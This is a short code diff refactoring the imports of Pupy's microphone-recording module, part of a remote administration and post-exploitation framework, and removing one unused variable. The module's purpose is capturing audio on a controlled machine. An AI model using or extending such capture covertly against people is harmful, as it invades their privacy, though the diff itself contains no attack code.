@@ -2,7 +2,11 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
-from pupylib import *
+from pupylib.PupyErrors import PupyModuleError
+from pupylib.PupyModule import (
+    config, PupyModule, PupyArgumentParser
+)
+
 import wave, datetime, os.path, subprocess
 
 __class_name__="RecordMicrophoneModule"
@@ -34,7 +38,6 @@ class RecordMicrophoneModule(PupyModule):
         except Exception:
             pass
         self.success("starting recording for %ss ..."%args.time)
-        data=b""
         max_length=args.max_length
         if max_length is None:
             max_length=args.time
